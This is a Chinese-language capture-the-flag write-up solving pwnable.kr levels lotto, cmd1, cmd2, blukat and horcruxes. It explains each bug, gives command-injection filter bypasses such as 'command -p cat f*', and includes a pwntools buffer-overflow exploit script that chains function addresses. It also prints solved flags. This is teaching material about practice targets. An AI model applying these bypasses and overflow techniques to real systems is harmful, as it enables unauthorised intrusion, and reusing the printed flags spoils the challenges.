作者：萌新合天智汇

[](https://zhuanlan.zhihu.com/p/110813832)<https://www.freebuf.com/column/229237.html>

[](https://zhuanlan.zhihu.com/p/111012711)<https://www.freebuf.com/column/229330.html>

[](https://zhuanlan.zhihu.com/p/111311680)<https://www.freebuf.com/column/229530.html>

回顾一下前篇，我们开始新的内容吧  

## 0x12  

登录后看源码

![v2-62bb9ca8ea8d041d7046224cea324495_r.jp](https://pic2.zhimg.com/v2-62bb9ca8ea8d041d7046224cea324495_r.jpg)

![v2-6a977d592786638e49e2c309828c4780_r.jp](https://pic2.zhimg.com/v2-6a977d592786638e49e2c309828c4780_r.jpg)

通读程序，逻辑是这样子的：

输入6个字符，与程序由/dev/urandom随机产生的6个字符对比，通过上图第二个红框的检验，则match自加1，双重for循环结束后如果match=6则打印flag

这里的漏洞在于检验的双重for循环实现时出了问题。

该程序实现的逻辑实际上是对于每个lotto[i]会和输入的每个字符去比较，如果命中则加1

那么我们可以考虑输入的6个字符相同，如果有一个命中，则全部命中。

字符的取值范围知道是在ascii 1-45之间，又我们能输入的只有asci中的可见字符，那满足条件的只有33-45

![v2-668f146fe169bf38a5b1f5ebc181337e_r.jp](https://pic4.zhimg.com/v2-668f146fe169bf38a5b1f5ebc181337e_r.jpg)

多试几次即可。

![v2-9274e610844a6cdff2778abb036bf6d1_r.jp](https://pic2.zhimg.com/v2-9274e610844a6cdff2778abb036bf6d1_r.jpg)

## 0x13cmd1  

看看源码

![v2-f8b1e37379e1bedb923a77db96c9a8de_r.jp](https://pic1.zhimg.com/v2-f8b1e37379e1bedb923a77db96c9a8de_r.jpg)

在main中可以看到我们输入的参数可以通过调用system执行

但是在传给system执行前，输入的内容会被filter处理

而filter过滤了tmp,flag,sh这些关键字

而且还有一点需要注意的是，我们绕过filter之后，还得注意main中的putenv,它将PATH环境变量设置为了乱七八糟的东西

PATH决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列目录，当运行一个程序时，Linux在这些目录下进行搜寻编译链接

修改之后意味着我们要使用命令时需要使用绝对路径，比如要想读flag,正常情况下应该是cat flag，但是现在需要/bin/cat flag

综上，绕过

![v2-47fb3e0ecc953b1dca3d69355e9e2f44_r.jp](https://pic1.zhimg.com/v2-47fb3e0ecc953b1dca3d69355e9e2f44_r.jpg)

这里我们用到了通配符*，使用f*匹配flag文件，从而绕过

## 0x13cmd2  

看源码

#include <stdio.h>

#include <string.h>

  

int filter(char* cmd){

int r=0;

r += strstr(cmd, "=")!=0;

r += strstr(cmd, "PATH")!=0;

r += strstr(cmd, "export")!=0;

r += strstr(cmd, "/")!=0;

r += strstr(cmd, "`")!=0;

r += strstr(cmd, "flag")!=0;

return r;

}

  

extern char** environ;

void delete_env(){

char** p;

for(p=environ; *p; p++) memset(*p, 0, strlen(*p));

}

  

int main(int argc, char* argv[], char** envp){

delete_env();

putenv("PATH=/no_command_execution_until_you_become_a_hacker");

if(filter(argv[1])) return 0;

printf("%s\n", argv[1]);

system( argv[1] );

return 0;

}

可以看到比之cmd1,这里过滤了更多的东西

尤其是\

我们当然还可以使用f*来指代flag

但是\的过滤怎么绕过呢

题目给了提示

![v2-c7777d78b674095e6a5cbbd814c4c1e6_r.jp](https://pic3.zhimg.com/v2-c7777d78b674095e6a5cbbd814c4c1e6_r.jpg)

来看看system函数

![v2-82cacaa35c9f0e7d9b011046b2acf647_r.jp](https://pic2.zhimg.com/v2-82cacaa35c9f0e7d9b011046b2acf647_r.jpg)

可以看到system()实际上是通过execl实现的

查找sh的man

可以看到

![v2-7f7bc197ad83c17d51319a1e6303b431_r.jp](https://pic3.zhimg.com/v2-7f7bc197ad83c17d51319a1e6303b431_r.jpg)

使用-p时会可以自动找到path的默认值，而不受程序设置ENV的影响

所以可以考虑使用-p cat，这样就可以自动绕过/

cmd2@ubuntu:~$ ./cmd2 "command -p cat f*"

command -p cat f*

FuN_w1th_5h3ll_v4riabl3s_haha

## 0x14blukat  

看源码

![v2-01fd9945778d981a241f02eb34c20b7d_r.jp](https://pic2.zhimg.com/v2-01fd9945778d981a241f02eb34c20b7d_r.jpg)

从password文件读内容，与我们输入的字符相比，通过比较则打印flag

现在的关键是知道password的内容是什么，我们注意到下图的情况：

![v2-73523e8a3820fbbfab190b6956ed9680_r.jp](https://pic1.zhimg.com/v2-73523e8a3820fbbfab190b6956ed9680_r.jpg)

从上图可以看到我们这个用户所在的组对password是有读权限的，可是cat的时候却是：

![v2-2dabbff6d5861320f74c2b21f8b1be52_r.jp](https://pic2.zhimg.com/v2-2dabbff6d5861320f74c2b21f8b1be52_r.jpg)

emmm也就是说password本身的内容就是这个

于是执行二进制文件就得到flag了

![v2-eb0e33b6628ecd0425cdaa19248f92b2_r.jp](https://pic4.zhimg.com/v2-eb0e33b6628ecd0425cdaa19248f92b2_r.jpg)

## 0x15horcruxes  

![v2-0b1b49d80eb4bce190c2f5bb011a1441_r.jp](https://pic1.zhimg.com/v2-0b1b49d80eb4bce190c2f5bb011a1441_r.jpg)

没有源码，就给了二进制文件，看来得逆向了

执行后需要输入的地方有两处

![v2-ff54c5db404a9443394822bff316f8dc_r.jp](https://pic2.zhimg.com/v2-ff54c5db404a9443394822bff316f8dc_r.jpg)

下载到本地

![v2-33de3e52ed023749eab0d53bb196736c_r.jp](https://pic3.zhimg.com/v2-33de3e52ed023749eab0d53bb196736c_r.jpg)

可以看到是32位的

![v2-7ec3f444ef9cc98cf5cca3f078a5a173_r.jp](https://pic3.zhimg.com/v2-7ec3f444ef9cc98cf5cca3f078a5a173_r.jpg)

上ida

![v2-42d5168d867037e5fb427b676301ba55_r.jp](https://pic4.zhimg.com/v2-42d5168d867037e5fb427b676301ba55_r.jpg)

main函数

![v2-2b0979ebac4f0f782ec477b4c181f2a3_r.jp](https://pic2.zhimg.com/v2-2b0979ebac4f0f782ec477b4c181f2a3_r.jpg)

ropme

![v2-7f83e8ce9d0c83898fa92e86d80d5081_r.jp](https://pic3.zhimg.com/v2-7f83e8ce9d0c83898fa92e86d80d5081_r.jpg)

红色圈起来的就是我们之前试运行时输入的地方

最下面的else可以看到，当我们的输入和sum值相等时会打印flag

注意到上面有A,B,C,D,E,F,G函数

打开A函数看看

![v2-178efd124baadbdf9eb10cfac1120d45_r.jp](https://pic4.zhimg.com/v2-178efd124baadbdf9eb10cfac1120d45_r.jpg)

B的

![v2-ccf91fc31026788fbcb9feb9b5262013_r.jp](https://pic3.zhimg.com/v2-ccf91fc31026788fbcb9feb9b5262013_r.jpg)

别的都是一样的

可以看到会返回a,b等

这些参数的赋值操作在init_ABCDEFG

![v2-536f9c9d0f1d6218a925a55146c796ff_r.jp](https://pic4.zhimg.com/v2-536f9c9d0f1d6218a925a55146c796ff_r.jpg)

可以看到是/dev/urandom产生的随机数配合产生的，而sum的值是综合计算a,b,c等得到的

这里的漏洞在于main中的gets（），没有指定buffer，所以可以尝试溢出

我们希望直接通过溢出buffer来覆盖ropme()函数的return地址

![v2-e72d7d1fc600c2704869aa661bfb8c7f_r.jp](https://pic2.zhimg.com/v2-e72d7d1fc600c2704869aa661bfb8c7f_r.jpg)

由上图可知buffer起始地址为ebp-0x74,加上原函数ebp地址的长度4个字节，则buffer起始到ropme（）的return一共需要0x74+4=120个字节

那么我们构造的思路就是依次打印A.B,,,,G函数返回的值，将其相加，得到sum的确定值，然后返回ropme，将结果作为输入，即可满足条件得到flag

要作为这一点，我们需要知道

  1. padding大小，由前可知，120字节  

  2. 然后拼接A函数的起始地址，来跳转到A执行，然后拼接B的。。。。以此类推  

  3. 最后要跳转到ropme()，这里要注意，不能直接凭借ropme的地址，因为该地址如下图所示含有\x0a，会被截断，所以要通过拼接main中调用ropme()时的地址  

![v2-86efa4fd7525d73b05db5a3703c85917_r.jp](https://pic2.zhimg.com/v2-86efa4fd7525d73b05db5a3703c85917_r.jpg)

接下来的任务就是找地址了

如图所示一个个找出来并不难，以A为例

![v2-6a93514e18c6661d0ff432f479b2211b_r.jp](https://pic1.zhimg.com/v2-6a93514e18c6661d0ff432f479b2211b_r.jpg)

以及main中调用ropme的

![v2-9db17db7a9958c2495cb8881a0b6b40d_r.jp](https://pic4.zhimg.com/v2-9db17db7a9958c2495cb8881a0b6b40d_r.jpg)

综上所述，写出exp：

from pwn import *

context.log_level='debug'

LOCAL = False

if __name__ == '__main__':

if LOCAL:

c = process('/home/horcruxes/horcruxes')

else:

c = remote('0', 9032)

msg = c.recvuntil("Menu:")

c.sendline('1')

msg = c.recv(512)

payload = 'A'*0x78

payload += p32(0x809fe4b) # address A（）

payload += p32(0x809fe6a) # address B（）

payload += p32(0x809fe89) # address C（）

payload += p32(0x809fea8) # address D（）

payload += p32(0x809fec7) # address E（）

payload += p32(0x809fee6) # address F（）

payload += p32(0x809ff05) # address G（）

payload += p32(0x809fffc) # address main<call ropme>

c.sendline(payload)

sum = 0

c.recvline()

for i in range(7):

s = c.recvline()

n = int(s.strip('\n').split('+')[1][:-1])

sum += n

print "Result: " + str(sum)

c.recvuntil("Menu:")

c.sendline("1")

c.recvuntil(" : ")

c.sendline(str(sum))

log.success("Flag: " + c.recvline())

![v2-7448ddd4b2f2e6f0677e6fa2a61845d8_r.jp](https://pic3.zhimg.com/v2-7448ddd4b2f2e6f0677e6fa2a61845d8_r.jpg)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

##  

  

